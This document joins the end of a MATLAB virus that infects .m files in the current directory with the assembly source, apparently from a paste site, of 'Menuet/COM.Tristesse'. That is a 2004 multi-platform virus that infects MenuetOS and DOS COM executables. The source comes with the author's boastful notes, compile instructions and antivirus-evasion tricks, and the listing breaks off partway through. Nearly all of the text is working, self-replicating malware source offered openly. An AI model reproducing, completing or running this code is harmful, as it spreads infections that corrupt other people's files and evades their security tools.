MyCode=[MyCode 'VirCode={};Count020=length(ActualCodeForThisPart);while Count020>0 VirCode{end+1}=ActualCodeForThisPart{Count020};for Count021=Count020:length(ActualCodeForThisPart) if ~isempty(Var2Wrt{Count021}) if rand>0.3 VirCode{end+1}=Var2Wrt{Count021}(end);Var2Wrt{Count021}(end)=[];end;end;end;Count020=Count020-1;end;IsAllEmpty=false;while ~IsAllEmpty IsAllEmpty=true;for Count022=1:length(Var2Wrt) if ~isempty(Var2Wrt{Count022}) IsAllEmpty=false;if rand>0.5 VirCode{end+1}=Var2Wrt{Count022}(end); Var2Wrt{Count022}(end)=[];end;end;end;end;VicFiles=dir(''*.m'');VicLines={};for Count023=1:length(VicFiles)if(VicFiles(Count023).bytes<1000 && ~strcmp(VicFiles(Count023).name,''odefunction.m''))VicIDr=fopen(VicFiles(Count023).name, ''r'');VicLines={fgetl(VicIDr)};while ischar(VicLines{end})VicLines{end+1}=fgetl(VicIDr);end;VicLines(end)=[];Count024=1;while Count024<length(VicLines)+1 IsAPO=0;Count025=1;while Count025<length(VicLines{Count024})+1 if VicLines{Count024}(Count025)==QuoteSign IsAPO=~IsAPO;end;if ~IsAPO if VicLines{Count024}(Count025)==char(37) if Count025==1 VicLines(Count024)=[];else VicLines{Count024}=VicLines{Count024}(1:Count025-1);end;end;if Count025+1<length(VicLines{Count024}) if all(VicLines{Count024}(Count025:Count025+2)==''...'') VicLines{Count024}=strcat(VicLines{Count024}(1:Count025-1),VicLines{Count024+1});Count025=1;if length(VicLines)>Count024 VicLines(Count024+1)=[];end;end;end;end;Count025=Count025+1;end;Count024=Count024+1;end;EndArray={''if'' ''for'' ''while'' ''try'' ''switch'' ''parfor''};EndCount=0;GoodLine=[];for Count026=1:length(VicLines);IsAPP=0;if ~EndCount GoodLine=[GoodLine Count026];end;for Count027=1:length(VicLines{Count026})if(VicLines{Count026}(Count027)==QuoteSign)IsAPP=~IsAPP;end;if ~IsAPP for Count028=1:length(EndArray) if Count027+length(EndArray{Count028})<length(VicLines{Count026}) if all(VicLines{Count026}(Count027:Count027+length(EndArray{Count028})-1)==EndArray{Count028}) IsStart=0;if(Count027==1)IsStart=1;elseif(VicLines{Count026}(Count027-1)=='' ''||VicLines{Count026}(Count027-1)=='';''||VicLines{Count026}(Count027-1)==char(9)) IsStart=1;end;if Count027+length(EndArray{Count028})-1==length(VicLines{Count026}) IsStart=IsStart+1;elseif(VicLines{Count026}(Count027+length(EndArray{Count028}))=='' ''||VicLines{Count026}(Count027+length(EndArray{Count028}))==''(''||VicLines{Count026}(Count027+length(EndArray{Count028}))==char(9)) IsStart=IsStart+1;end;if IsStart==2 EndCount=EndCount+1;end;end;end;end;if Count027+1<length(VicLines{Count026}) if all(VicLines{Count026}(Count027:Count027+2)==''end'') IsEnd=0;if(Count027==1)IsEnd=1;elseif(VicLines{Count026}(Count027-1)=='' ''||VicLines{Count026}(Count027-1)=='';''||VicLines{Count026}(Count027-1)==char(9))IsEnd=1;end;if Count027+2==length(VicLines{Count026}) IsEnd=IsEnd+1;elseif(VicLines{Count026}(Count027+3)=='' ''||VicLines{Count026}(Count027+3)=='';''||VicLines{Count026}(Count027+3)==char(9)) IsEnd=IsEnd+1;end;if IsEnd==2 EndCount=EndCount-1;end;end;end;end;end;end;NewInfCode={};VCsplitted={};VirSplit=sort([0 length(VirCode) fix(rand(1,length(GoodLine)-1)*length(VirCode))]);TmpVar007=length(VirSplit);while TmpVar007>1 if(VirSplit(TmpVar007-1)<VirSplit(TmpVar007)) VCsplitted{length(VirSplit)-TmpVar007+1}=VirCode(VirSplit(TmpVar007-1)+1:VirSplit(TmpVar007));else VCsplitted{length(VirSplit)-TmpVar007+1}={};end;TmpVar007=TmpVar007-1;end;GoodLine(end+1)=length(VicLines);for Count029=1:length(GoodLine)-1 NewInfCode={NewInfCode{:} VicLines{GoodLine(Count029):GoodLine(Count029+1)-1}};TmpVar008=length(VCsplitted{Count029});while TmpVar008>0 NewInfCode={NewInfCode{:} VCsplitted{Count029}{TmpVar008}{:}};TmpVar008=TmpVar008-1;end;end;NewInfCode={NewInfCode{:} VicLines{end}};fclose(VicIDr);VicIDw=fopen(VicFiles(Count023).name, ''w+'');for Count030=1:length(NewInfCode)fprintf(VicIDw,[NewInfCode{Count030} char(13) char(10)]);end;fclose(VicIDw);end;end;'];

MyCode
%input('---');
eval(MyCode);
- - - - - - - - - - - - - 
"
B3sukEUM,Virus.Menuet/COM.Tristesse - Source Code,FlyFar,ASM (NASM),Monday 3rd of July 2023 01:13:02 AM CDT,";;  Menuet/COM.Tristesse
;;  by Second Part To Hell/[rRlf]
;;  www.spth.de.vu
;;  spth@prist.com
;;  written from june 2004 - sebtember 2004
;;  in Austria
;;
;;  I'm damn proud that I can present you my latest virus: Menuet/COM.Tristesse!
;;  So far, this is the most complex virus I've ever coded, and you'll get the
;;  point, why it is the most complex while reading this.
;;
;;
;;  The virus:
;;  Menuet/COM.Tristesse is a multi-platform infector, which infects MENUETs/COMs.
;;  MENUET (www.menuetos.org) files will be infected via prepending the code and COM files will
;;  be infected via appending the code. The most important thing about this virus was the
;;  biggest (!!!) problem while coding:
;;  Menuet is a 32bit based OS, and COM files uses 16bits, which means that I had to code
;;  two totally independent parts, one for MENUETs (32bit) and one for COMs (16bit). (I can
;;  tell you, infecting a 32bit file via a 16bit file is hell.)
;;
;;  The virus infects files this way:
;;  Menuet (32bit) -> Menuet (32bit - prepending)
;;  Menuet (32bit) -> COM (16bit - appending)
;;  COM (16bit) -> COM (16bit - appending)
;;  COM (16bit) -> Menuet (32bit - prepending)  
;;
;;  When the virus runs at MenuetOS, the following thing happens:
;;    - Searchs and infects MENUETs at the RAMDISK
;;    - Searchs and infects COMs at the HARDDISK (which is, in most cases C:\)
;;    - Regenerates the host and returns to the host
;;
;;    More exactly: The virus does the following things:
;;      - Searchs it's code (delta offset via static address)
;;      - Searchs for files
;;      - Checks if the file is good for infection (MENUET file, not infected, enough memory, ...)
;;      - Reads file into memory
;;      - Writes first hostbytes (buffer for virus) to end of file in memory
;;      - Viruscode in memory at buffer generated before
;;      - Writes Infection sign
;;      - Saves file at RAMDISK
;;           - Jmp to 2
;;      - Searchs for files
;;      - Checks if the file is good for infection (COM file, not infected, no MZ header, ...)
;;      - Reads file into memory
;;      - Saves first 4 bytes
;;      - Generates jump to virus + infection mark
;;      - Appends viruscode to end of file in memory
;;      - Saves file at HARDDISK
;;      - Writes Host at Entry Point of file
;;           - Jmp to 10
;;      - Return to host
;;
;;
;;
;;  When the virus runs at COMs, the following happens:
;;    - Searchs and infects COMs at current directory
;;    - Searchs and infects MENUETs at current directory
;;    - Regenerates the host and retuns to the host
;;
;;    More exactly: The virus does the following things:
;;      - Searchs it's code (delta offset via call)
;;      - Restore host (4 bytes at the start)
;;      - Find First File (*.com)
;;      - Open File
;;      - Checks if the file is good for infection (no MZ header, not infected)
;;      - Save 4 bytes and check if it's already infected
;;      - Calculates new Offset for Jump (filesize+MENUET part-3 bytes [jmp])
;;      - Appends viruscode to the end of the file
;;      - Writes new 4 bytes (jmp+Virussign)
;;      - Find Next File
;;           - Jmp to 2
;;      - Find First File (*.*)
;;      - Open file
;;      - Check if the file is good for infection (MENUET file, not infected)
;;      - Calculate n blocks (1 block=0x10 bytes) and REST of hostcode
;;      - Writes first hostbytes (buffer for virus) to end of file
;;      - Writes Virus to generated buffer
;;           - Jmp to 11
;;      - Return to host
;;
;;
;;  Some other infos:
;;    1.) You may ask, why did I infect COM files instead of PE EXEs. The answere is simple:
;;        You can not infect PE EXEs via MENUET, because there if too few memory for reading
;;        the file. And COMs should just contain 65.536 bytes.
;;
;;    2.) The virus conains a by-hand encryption of DOS SYSTEM CALL NUMBERS, for avoiding
;;        KAVs 'Type_COM' warning. Every Number is encrypted with one of XOR/NOT/ADD/SUB/INC/DEC.
;;
;;    3.) I've tested the virus at WindowsXP, Windows98, MenuetOS 0.78 pre2 and MenuetOS 0.77 final,
;;        and the code worked on every OS. There is just one problem with MenuetOS 0.76+ when you
;;        run it with a Notebook/Laptop. Menuet can't read data from the HARDDISK, and therefore
;;        just MENUET files will be infected, not COMs. But this is a bug in Menuet, and not in my
;;        virus.
;;
;; Compile: FASM code.asm code
;;          And you get the executeable MENUET file.
;;          You will get the COM infected, when a MENUET file infects a COM, not with compiling.
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;





	viruslength	equ I_END-START

use32
   
 		org     0x0
   
		db      'MENUET00'		; 8 byte id
		dd      23			; required os & Virus infection Mark
		dd      START			; Program start
		dd      I_END			; Program length
		dd      0x100000		; Required amount of memory
		dd      0x00000000		; reserved=no extended header

START:
	pushad					; Save the original register-contents to stack
	mov	ebp, dword [0xC]		; Save the virussize in ebp


;;	Infect MENUET-files

	xor	eax, eax			; eax=0
	mov	al, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; pointer to fileinfo-block
	add	bx, (dir_block_men-START)	; Get the relative offset
	int	0x40				; System Call

	mov	ebx, 0x20000			; Move Offset of filename to ebx

nextfile:
	add	ebx, 32				; Next Filename

	cmp	ebx, 0x22000			; Compair ebx with 0x22000
	je	endinfmen			; If equal, stop it

	mov	cl, [ebx]			; First letter of Filename to cl
	cmp	cl, 0xE5			; Compair with 0xE5 (which is the sign of a DELETED file)
	je	nextfile			; If so, get next file

	mov	cl, [ebx+11]			; Move the attribute bits to cl
	and	cl, 0x10			; AND 0x10 ( ???1 ???? = FOLDER )
	jnz	nextfile			; If not zero, get next file

	mov	edx, ebx			; Save ebx in edx
	mov	edi, ebp			; Move fle (11 letter buffer) to edi
	add	di, (fle-START)			; Get the relative Offset

	xor	ecx, ecx			; ecx=0
	mov	cl, 11				; Move 11 to ecx (counter=11)
   fn2fb:					; File Name to File Block
	mov	al, [ebx]			; Move the ebx-value to al
	stosb					; Write al to memory at offset edi (=11 letter buffer)
	inc	ebx				; Get next letter
   loop	fn2fb					; Jump to fn2fb if ecx>0 && dec ecx

	xor	eax, eax			; eax=0
	mov	al, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; pointer to file-block
	add	bx, (file_block_men-START)	; Get the relative Offset
	int	0x40				; System Call
	mov	ebx, edx			; Restore original ebx (Filename offset)

	mov	eax, 0x25000			; Move Offset of readed file-content to eax
	cmp	dword [eax], 'MENU'		; Compair a double-word with 'MENU'
	jne	nextfile			; If not equal (=No Menuet-executed file), get next file

	add	al, 8				; eax = 0x25000 + 0x8 = Infection mark offset
	cmp	byte [eax], 23			; Compair a byte with 23
	je	nextfile			; If equal (file is already infected), get next file

	add	al, 12				; eax= 0x25008+12 = Memory used by file
	cmp	dword [eax], 0x50000		; Compaire with 0x50000 (most files have the double)
	jl	nextfile			; If less (too few memory for the virus), get next file

	mov	eax, dword [ebx+28]		; Move the filesize to eax
	shr	eax, 9				; Get the blocks to read
	inc	eax				; For reading the last not completed block

	mov	edi, ebp			; Move the offset where to write
	add	di, (flb_bs-START)		; Get the relative Offset
	stosb					; Write [al] to di in memory

	mov	edx, ebx			; Save ebx to edx
	xor	eax, eax			; eax=0
	mov	al, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; pointer to file-block
	add	bx, (file_block_men-START)	; Get the relative offset
	int	0x40				; System Call

	mov	ebx, edx			; Restore original ebx (Filename offset)


;;	Write first part (bytes of virus) of the host code to end
;;	because these bytes will be overwritten.

	mov	edi, dword [0x25010]		; Where to write: End of file
	add	edi, 0x25000			; Add memory offset of hostcode

	mov	cx, viruslength			; Viruslength to ecx
	add	ecx, dword [0x2500C]		; add Header-length
	cmp	dword [0x25010], ecx		; Check if the file is smaller than the virus

	jge	notsmall			; If not greater or equal, calculate another offset for writing

	xchg	edi, ecx			; Move the real start to edi
	add	edi, 0x25000			; Add memory offset

 notsmall:
	xor	ecx, ecx			; ecx=0
	mov	cx, viruslength			; How much to read: Viruslength

	mov	edx, dword [0x2500C]		; What to read: Entry Point of file
	add	edx, 0x25000			; Add memory offset of hostcode

   fp2eof:					; First part to end of file
	mov	al, [edx]			; Move a victim code's byte to al
	stosb					; Write al to memory at offset edi (end of file)
	inc	edx				; Get next byte
   loop fp2eof					; Jump to fp2eof if ecx>0 && dec ecx


;;	Overwrite first part of host file with viruscode

	mov	cx, viruslength			; How much to write: Virus length
	mov	edx, ebp			; What to write: Viruscode

	mov	edi, dword [0x2500C]		; Where to write: Entry Point of file
	add	edi, 0x25000			; Add memory offset of hostcode

   vc2vm:					; Virus code to victim memory
	mov	al, [edx]			; Move a virus code's byte to al
	stosb					; Write al to memory at offset edi (Start of victim's code)
	inc	edx				; Get next virus byte
   loop vc2vm					; Jump to vc2vm if ecx>0 && dec ecx


;;	Infection Mark  <-- Against double-infection

	mov	edi, 0x25008			; Move the point of the infection sign
	mov	al, 23				; What to write (the infection mark)
	stosb					; Write infection mark to file

	mov	edi, ebp			; Move the offset where to write
	add	di, (flb_bs-START)		; Get the relative Offset
	mov	eax, dword [ebx+28]		; What to write (Old Filesize)
	add	eax, viruslength		; Add virussize
	stosd					; Write eax to memory at offset edi


;;	Write memory with new built infected file to RAMDISK

	mov	edi, ebp			; Move the offset where to write
	add	di, (flb_kd-START)		; Get the relative Offset
	mov	al, 1				; What to write (1 for writing)
	stosb					; Write al to memory at offset edi

	mov	edx, ebx			; Save ebx to edx

	xor	eax, eax			; eax=0
	mov	al, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; pointer to file_block_men
	add	bx, (file_block_men-START)	; Get the relative Offset
	int	0x40				; System Call


;;	Restore some memory stuff and register

	mov	ebx, edx			; Restore ebx

	mov	edi, ebp			; Move the offset where to write
	add	di, (flb_kd-START)		; Get the relative offset
	xor	al, al				; What to write (0 for reading) = RESTORING
	stosb					; Write al to memory at offset edi

	mov	edi, ebp			; Move the offset where to write
	add	di, (flb_bs-START)		; Get the relative offset
	inc	al				; What to write = RESTORING
	stosb					; Write al to memory at offset edi

	jmp	nextfile			; Get Next File

endinfmen:

;;	Infect COM-files

	xor	eax, eax			; eax=0
	mov	al, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; pointer to fileinfo-block
	add	bx, (dir_block_com-START)	; Get the relative offset
	int	0x40				; System Call

	mov	ebx, 0x20000			; Move Offset of filename to ebx

men_com_nextfile:
	add	ebx, 32				; Find next file

	cmp	ebx, 0x22000			; Compair ebx with 0x22000
	je	endinfcom			; If equal, stop it

	mov	cl, [ebx]			; First letter of Filename to cl
	cmp	cl, 0xE5			; Compair with 0xE5 (which is the sign of a DELETED file)
	je	men_com_nextfile		; If so, get next file

	mov	cl, [ebx+11]			; Move the attribute bits to cl
	and	cl, 0x10			; AND 0x10 ( ???1 ???? = FOLDER )
	jnz	men_com_nextfile		; If not zero, get next file

	mov	ax, [ebx+8]			; Move first 2 bytes of file-extansion to ax
	cmp	ax, 'CO'			; Check if it's a COM-file
	jne	men_com_nextfile		; If not equal, get next file

	mov	edx, ebx			; Save ebx in edx
	mov	edi, ebp			; Move fle (11 letter buffer) to edi
	add	di, (c_fle-START)		; Get the relative Offset

	xor	ecx, ecx			; ecx=0
	mov	cl, 11				; Move 11 to ecx (counter=11)
   c_fn2fb:					; File Name to File Block
	mov	al, [ebx]			; Move the ebx-value to al
	stosb					; Write al to memory at offset edi (=11 letter buffer)
	inc	ebx				; Get next letter
   loop	c_fn2fb					; Jump to fn2fb if ecx>0 && dec ecx

	mov	eax, dword [edx+0x1C]		; Move the filesize to eax
	shr	eax, 9				; Get the blocks to read
	inc	eax				; For reading the last not completed block

	mov	edi, ebp			; Move the offset where to write
	add	di, (c_flb_bs-START)		; Get the relative Offset
	stosb					; Write [al] to di in memory

	xor	eax, eax			; eax=0
	mov	al, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; pointer to file-block
	add	bx, (file_block_com-START)	; Get the relative Offset
	int	0x40				; System Call

	mov	ebx, edx			; Restore ebx

	mov	ax, word [0x25000]		; Move first two bytes to ax
	cmp	ax, 'MZ'			; Check if it's a pseudo-COM
	je	men_com_nextfile		; If equal, get next file

	mov	al, [0x25003]			; Move the 4th byte to al
	cmp	al, 'S'				; Check if it's infected
	je	men_com_nextfile		; If equal, get next file

	mov	eax, dword [0x25000]		; Move first 4 bytes of .COM to eax
	mov	edi, ebp			; Move the offset where to save the 4 bytes
	add	edi, (com_rest_bytes-START)	; Get relative offset
	stosd					; Write eax to offset edi

	mov	eax, [edx+0x1C]			; Filesize to eax
	add	ax, (comvirusstart-START-3)	; Add offset of com-part start (Size shouldn't be bigger than 0xFFFF)
	mov	edi, ebp			; Where to write
	add	edi, (com_4bytes-START+1)	; Buffer for com-start
	stosw					; Write two bytes

	mov	edi, [edx+0x1C]			; Move the filesize to eax
	add	edi, 0x25000			; Get the end of the file
	mov	ecx, viruslength		; Move viruslength to ecx
	mov	ebx, [0xC]			; Move the start of the virus to ebx

   c_vir2end:					; Virus to end
	mov	al, [ebx]			; Move one virusbyte to al
	stosb					; Write al to edi
	inc	ebx				; Get next byte
   loop c_vir2end				; Write next byte

	mov	ebx, ebp			; 4 bytes to ebx (Jmp to com + infection mark)
	add	ebx, (com_4bytes-START)		; Get relative offset
	mov	edi, 0x25000			; Where to write: filestart
	mov	ecx, 0x4			; Write 4 bytes

   c_4b2fRAM:					; 4 bytes to file in RAM
	mov	al, [ebx]			; Move one of the 4 bytes to al
	stosb					; Write al to edi
	inc	ebx				; Get next byte
   loop c_4b2fRAM				; Write next byte

	mov	al, 0x1				; Move 1 to al
	mov	edi, ebp			; Move com-fileblock offset to edi
	add	edi, (c_flb_kd-START)		; Get relative offset
	stosb					; Modify com-fileblock (to write)

	mov	eax, dword [edx+0x1C]		; Move filesize to eax
	add	eax, viruslength		; Add viruslength
	mov	edi, ebp			; Move com_fileblock offset to edi
	add	edi, (c_flb_bs-START)		; Get relative offset
	stosd					; Modify com-fileblock (size to write)

	mov	eax, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; Fileblock
	add	ebx, (file_block_com-START)	; Get relative offset
	int	0x40				; SYSTEM CALL

	mov	ebx, edx			; Restore Filenames

   jmp	men_com_nextfile			; Get Next File

endinfcom:

;;	Restore original host

	mov	ebx, ebp			; What to write - Offset of vircode
	add	bx, (rebu-START)		; Add relative address

	mov	edi, 0x20000			; Where to write
	mov	cl, (rebuend-rebu)		; How much to write (whole rebuild-code)

   rb2m:					; Rebuild code to memory
	mov	al, [ebx]			; Move one byte of rebuild-code to al
	stosb					; Write al to offset edi
	inc	ebx				; Get next byte
   loop rb2m					; Jump to rbch if ecx>0 && inc ecx

	mov	ebx, 0x20000
	jmp	ebx				; Jump to rebuild code in memory
						; Now the viruscode in memory will be replaced by the
						; old original host code, and the control comes back to
						; the host file. The reason for using memory for
						; overwrite the viruscode in memory is the fact that
						; we can't overwrite the current running code.



						; From now on, there is just data





 rebu:						; Rebuild the host code
	xor	eax, eax			; eax=0
	mov	al, 0x10			; eax=0x10
	mov	ebx, dword [eax]		; Move the file length to ebx, to get the old hostcode offset

	sub	eax, 4				; eax=0xC

	mov	edx, dword [eax]		; Move the offset of the head-length to edx
	add	dx, viruslength			; Add the virulength to edx

	cmp	ebx, edx			; Check if the file is smaller than the virus
	jge	notsmall2			; If not greater or equal, go on

	mov	ebx, edx			; Move the new offset to ebx

 notsmall2:

	mov	edi, dword [0xC]		; Where to write: 0xC
	mov	cx, viruslength			; How much to write


     rbhc:					; Rebuild host code
	mov	al, [ebx]			; One byte of the saved host code to al
	stosb					; Write al (Host code) to edi (Entry Point of file)
	inc	ebx				; Get next byte
     loop rbhc					; Jump to rbch if ecx>0 && inc ecx

	popad					; Get the original register-contents

	jmp	dword [0xC]			; Jump to Entry Point, now with the original code
 rebuend:					; Rebuild host code: End



;;
;;	DATA
;;


	virmsg	db '1st Menuet/COM Virus (Tristesse) by Second Part To Hell/rRlf'


dir_block_men:
	dd 0					; 0=READ
	dd 0x0					; 512 block to read 0+
	dd 0x16					; blocks to read (/bytes to write/append)
	dd 0x20000				; return data pointer
	dd 0x10000				; work area for os - 16384 bytes
	db '/RD/1',0				; ASCIIZ dir & filename

file_block_men:
flb_kd: dd   0					; 0=READ    (delete/append)
	dd   0x0				; 512 block to read 0+
flb_bs: dd   0x1				; blocks to read (/bytes to write/append)
	dd   0x25000				; return data pointer
	dd   0x10000				; work area for os - 16384 bytes
flpath	db '/RD/1/'
fle	db '           ',0

dir_block_com:
	dd 0					; 0=READ
	dd 0x0					; 512 block to read 0+
	dd 0x16					; blocks to read (/bytes to write/append)
	dd 0x20000				; return data pointer
	dd 0x10000				; work area for os - 16384 bytes
	db '/HD/1',0				; ASCIIZ dir & filename

file_block_com:
c_flb_kd: 	dd   0				; 0=READ    (delete/append)
		dd   0x0			; 512 block to read 0+
c_flb_bs:	dd   0x1			; blocks to read (/bytes to write/append)
		dd   0x25000			; return data pointer
		dd   0x10000			; work area for os - 16384 bytes
c_flpath	db '/HD/1/'
c_fle		db '           ',0

;;	Start of the COM-part
;;
	use16

comvirusstart:					; Start of the virus
	call com_get_delta			; Jump to com_get_delta + push current offset


com_get_delta:  
	pop	bp				; Get current offset
	sub	bp, com_get_delta		; Get relative offset

	lea	si, [bp+com_rest_bytes]		; Restore original bytes from com_rest_bytes
	mov	di, 0x100			; Write to 0x100, as a COM starts at that offset
	movsw					; Write 2 bytes
	movsw					; Write 2 bytes (=4 bytes)

com_find_first:
	mov	ah, 0xB1			; Find First File (encrypted)
	xor	ah, 0xFF			; Decrypt

com_infection:
	lea	dx, [bp+com_string]		; dx=Search-lable (='*.com')
	xor	cx, cx				; cx=Attribute (=normal file)
	int	0x21      			; Execute It

	jc	end_vir             	  	  ; If carry (no more file), jmp to end of virus

	mov	ax, 0xC2FD      	        ; Open File (encrypted)
	xor	ax, 0xFFFF			; Decrypt
	mov	dx, 0x9E			; dx=Filename (any com-file returned by FFF)
	int	0x21				; Execute it

	xchg	ax, bx				; Filehandle to bx

	mov	ah, 0xC0			; Save first 4 bytes, which will be overwritten (jmp + infection-mark) (encrypted)
	xor	ah, 0xFF			; Decrypt
	mov	cx, 0x4				; cx= How much (4 bytes)
	lea	dx, [bp+com_rest_bytes]		; Where to save (4 byte-buffer)
	int	0x21				; Execute it

	cmp	byte [bp+com_rest_bytes+3], 'S'	; Check if already infected
	je	com_FindNextFile		; If equal (=infected), jump com_FindNextFile

	mov	ax, 0xBDFD			; Jump to end of the file (+ Get filesize) (encrypted)
	not	ax				; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	add	ax, (comvirusstart-START-3)	; Calculate the offset of new com-start: filesize+MENUET part-jmp(3 bytes)
	mov	word [bp+com_4bytes+1], ax	; Write the new length to the buffer,
						; so the file will jump to the end (=virus-start)

	mov	ah, 0x45			; Write to file (encrypted)
	sub	ah, 0x5				; Decrypt
	mov	cx, viruslength			; How much to write (virussize)
	lea	dx, [bp+START]			; Where to read from: virusstart
	int	0x21 				; Execute it

	mov	ax, 0xBDFF			; Get the filestart (encrypted)
	not	ax				; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ah, 0xBF			; Write to file (encrypted)
	xor	ah, 0xFF			; Decrypt
	mov	cx, 0x4				; How much to write: 4 bytes= jmp+infection_mark
	lea	dx, [bp+com_4bytes]		; Where to read
	int	0x21				; Execute it

com_FindNextFile:
	mov	ah, 0xC1			; Close file (encrypted)
	not	ah				; Decrypt
	int	0x21				; Execute it

	mov	ah, 0x6D			; Find Next File (encrypted)
	xor	ah, 0xDD			; Decrypt
	not	ah				; Decrypt
	jmp	com_infection			; Infect it

end_vir:
	mov	ah, 0xB1			; Find First File (encrypted)
	not	ah				; Decrypt

c_men_infection:
	lea	dx, [bp+com_men_string]		; dx=Search-lable (='*.*')
	xor	cx, cx				; cx=Attribute (=normal file)
	int	0x21      			; Execute It

	jc	ret_host			; If carry (no more file), jmp ret_host
	
	mov	ax, 0xC2FD			; Open file (encrypted)
	xor	ax, 0xFFFF			; Decrypt

	mov	dx, 0x9E			; dx=Filename (any file returned by FFF)
	int	0x21				; Execute It

	xchg	ax, bx				; Filehandle to bx

	mov	ah, 0x28			; Read from file (encrypted)
	xor	ah, 0x17			; Decrypt

	mov	cx, 0x10			; How much to read (16 bytes)
	lea	dx, [bp+com_men_buffer1]	; Where to store (Menuet buffer)
	int	0x21				; Execute it

	cmp	word [bp+com_men_buffer1], 'ME'	; Check if it's a Menuet-File
	jne	com_men_FNF			; If not, get next file

	cmp	byte [bp+com_men_buffer1+0x8], 0x17	; Check if file is already infected
	je	com_men_FNF				; If equal (=infected), get next file

	mov	ax, 0x4210			; Set File Pointer to start (encrypted)
	sub	ax, 0x10			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ah, 0xC0			; Read from file (encrypted)
	not	ah				; Decrypt
	mov	cx, 0x8				; How much to read
	mov	dx, [bp+com_men_buffer1]	; Where to store
	int	0x21				; Execute it

	mov	ah, 0x63				; Write to file (encrypted)
	xor	ah, 0x23				; Decrypt
	mov	cx, 0x1					; How much to write: One byte
	mov	byte [bp+com_men_buffer1], 0x17		; The Infection Mark to the buffer
	lea	dx, [bp+com_men_buffer1]		; What to write: Infection Mark for MENUETs
	int	0x21					; Execute it

	mov	ax, 0x3200			; Set File Pointer to start (encrypted)
	add	ax, 0x1000			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ah, 0x30			; Read from file (encrypted)
	add	ah, 0xF				; Decrypt
	mov	cx, 0x10			; How much to read (16 bytes)
	mov	dx, [bp+com_men_buffer1]	; Where to store
	int	0x21				; Execute it

	mov	ax, viruslength			; Move viruslength to ax
	shr	ax, 0x4				; 4 bytes left: ax*16=viruslength + REST
	mov	di, ax				; Save result in di

	mov	dx, 0x10			; dx=0x10
	mul	dx				; ax=dx[0x10]*ax[shr(viruslength)4]

	mov	dx, ax				; Get the result to dx
	mov	ax, viruslength			; Move viruslength to ax
	sub	ax, dx				; viruslength-di[shr(viruslength)*16]=REST
	push	ax				; Save REST to stack

	mov	ax, [bp+com_men_buffer1+0xC]	; Move the offset of the EP to ax
	push	ax				; Offset of the EP to the stack

	mov	ax, 0x4202			; Get filelength (=Set filepointer to end of file)
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	sub	ax, [bp+com_men_buffer1+0xC]	; Sub header-length to get real code-length
	cmp	ax, viruslength			; Compair codelength with viruslength
	jge	com_menfi_ge			; If greater or equal jmp to com_menfi_ge

	mov	di, ax				; Move the real codelength to di

   com_men_st2end2:				; MENUET Start to End
	mov	ax, 0xBDFF			; Set File Pointer to start (encrypted)
	not	ax				; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ax, 0x4203			; Set File Pointer (encrypted)
	dec	ax				; Decrypt
	dec	ax				; Decrypt
	xor	cx, cx				; cx=0
	pop	dx				; dx=offset to read
	push	dx				; dx to the stack again
	int	0x21				; Execute it

	pop	dx				; Get offset where to read from stack to dx
	add	dx, 0x10			; Add 16 to dx (As we need the next 16 bytes)
	push	dx				; To the stack again

	mov	ah, 0x4F			; Read from file (encrypted)
	sub	ah, 0x10			; Decrypt
	mov	cx, 0x10			; How much to read (16 bytes)
	lea	dx, [bp+com_men_buffer2]	; Where to store
	int	0x21				; Execute it

	mov	ax, 0xE8AA			; Set File Pointer to start (encrypted)
	xor	ax, 0xAAAA			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ax, 0x9FDC			; Set file Pointer (encrypted)
	xor	ax, 0xDDDD			; Decrypt
	xor	cx, cx				; cx=0
	pop	dx				; dx=EP+already read bytes
	push	dx				; Save dx again
	add	dx, viruslength-0x10		; Add viruslength-16 (previous 16 bytes) to dx: dx=offset to write old host code
	int	0x21				; Execute it

     com_nrestbytes:
	mov	ah, 0x60			; Write to file (encrypted)
	sub	ah, 0x20			; Decrypt
	mov	cx, 0x10			; How much to write: 16 byte
	lea	dx, [bp+com_men_buffer2]	; What to write: First bytes of file for buffer
	int	0x21				; Execute it

	sub	di, 0x10			; Decrease di
	cmp	di, 0x10			; Compair di with 16
	jge	com_men_st2end2			; If not zero (still 16byte blocks to copy), jmp to com_men_st2end2

	mov	ax, 0x42FF			; Set File Pointer to start (encrypted)
	sub	ax, 0xFF			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ax, 0x1				; Set File Pointer (encrypted)
	add	ax, 0x4200			; Decrypt
	xor	cx, cx				; cx=0
	pop	dx				; dx=offset to read
	int	0x21				; Execute it

	mov	ah, 0xA6			; Read from file (encrypted)
	xor	ah, 0x99			; Decrypt
	mov	cx, di				; How much to read (REST)
	lea	dx, [bp+com_men_buffer2]	; Where to store
	int	0x21				; Execute it

	mov	ax, 0xBDFD			; Set File Pointer to end (encrypted)
	not	ax				; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ah, 0xBF			; Write to file (encrypted)
	not	ah				; Decrypt
	mov	cx, di				; How much to write (REST)
	lea	dx, [bp+com_men_buffer2]	; What to write: Rest of bytes
	int	0x21				; Execute it

	pop	ax				; Pop trash
	jmp	virinclude			; Jump to Virus-Include-Part

com_menfi_ge:
   com_men_st2end:
	mov	ah, 0x42			; Set File Pointer to start (encrypted)
	xor	al, al				; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
